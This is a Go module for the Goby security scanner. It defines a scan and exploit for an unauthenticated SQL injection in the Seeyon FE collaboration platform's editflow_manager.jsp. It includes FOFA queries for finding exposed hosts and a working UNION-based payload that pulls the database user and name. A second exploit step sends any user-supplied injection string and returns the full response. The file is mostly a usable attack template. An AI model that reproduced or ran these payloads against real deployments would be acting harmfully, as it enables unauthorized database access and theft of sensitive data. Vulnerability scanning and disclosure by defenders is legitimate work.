package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "SEEYON-FE /sysform/003/editflow_manager.jsp SQL Injection Vulnerability",
    "Description": "<p>The Seeyon FE Collaboration Office Platform is a product that provides enterprises with a comprehensive collaborative office solution. It integrates multiple functional modules aimed at helping companies achieve efficient team collaboration, information sharing, and document management.</p><p>There is an SQL injection vulnerability in the Seeyon FE Collaboration Office Platform at /sysform/003/editflow_manager.jsp. Attackers can bypass permissions to access the editflow_manager.jsp file without authorization and exploit this vulnerability to execute SQL commands and access sensitive information in the database.</p>",
    "Product": "SEEYON-FE",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2024-04-18",
    "PostTime": "2024-04-18",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "title=\"FE协作办公平台\" || body=\"li_plugins_download\"",
    "GobyQuery": "title=\"FE协作办公平台\" || body=\"li_plugins_download\"",
    "Level": "2",
    "Impact": "<p>There is an SQL injection vulnerability in the Seeyon FE Collaboration Office Platform at /sysform/003/editflow_manager.jsp. Attackers can bypass permissions to access the editflow_manager.jsp file without authorization and exploit this vulnerability to execute SQL commands and access sensitive information in the database.</p>",
    "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability.</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "%27+union+select+user%2b%27%7e%27%2bdb_name()+AS+ConcatenatedString--+",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/sysform/003/editflow_manager.jsp",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip"
                },
                "data_type": "text",
                "data": "option=2&GUID=-1%27+union+select+user%2b%27%7e%27%2bdb_name()+AS+ConcatenatedString--+"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "dbo~FE_BASE5",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/sysform/003/editflow_manager.jsp",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/sysform/003/editflow_manager.jsp"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/sysform/003/editflow_manager.jsp",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip"
                },
                "data_type": "text",
                "data": "option=2&GUID=-1{{{custom}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "致远互联FE /sysform/003/editflow_manager.jsp SQL 注入漏洞",
            "Product": "致远互联-FE",
            "Description": "<p>致远互联FE协作办公平台是一款为企业提供全方位协同办公解决方案的产品。它集成了多个功能模块，旨在帮助企业实现高效的只团队协作、信息共享和文档管理。</p><p>致远互联FE协作办公平台/sysform/003/editflow_manager.jsp存在SQL注入漏洞，攻击者通过权限绕过可以在未授权情况下访问editflow_manager.jsp文件，通过此漏洞执行sql命令，获取数据库敏感信息。&nbsp;</p>",
            "Recommendation": "<p>1、联系厂商获取修复漏洞措施</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>致远互联FE协作办公平台/sysform/003/editflow_manager.jsp存在SQL注入漏洞，攻击者通过权限绕过可以在未授权情况下访问editflow_manager.jsp文件，通过此漏洞执行sql命令，获取数据库敏感信息。&nbsp;<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "SEEYON-FE /sysform/003/editflow_manager.jsp SQL Injection Vulnerability",
            "Product": "SEEYON-FE",
            "Description": "<p>The Seeyon FE Collaboration Office Platform is a product that provides enterprises with a comprehensive collaborative office solution. It integrates multiple functional modules aimed at helping companies achieve efficient team collaboration, information sharing, and document management.</p><p>There is an SQL injection vulnerability in the Seeyon FE Collaboration Office Platform at /sysform/003/editflow_manager.jsp. Attackers can bypass permissions to access the editflow_manager.jsp file without authorization and exploit this vulnerability to execute SQL commands and access sensitive information in the database.</p>",
            "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability.</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is an SQL injection vulnerability in the Seeyon FE Collaboration Office Platform at /sysform/003/editflow_manager.jsp. Attackers can bypass permissions to access the editflow_manager.jsp file without authorization and exploit this vulnerability to execute SQL commands and access sensitive information in the database.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10942"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}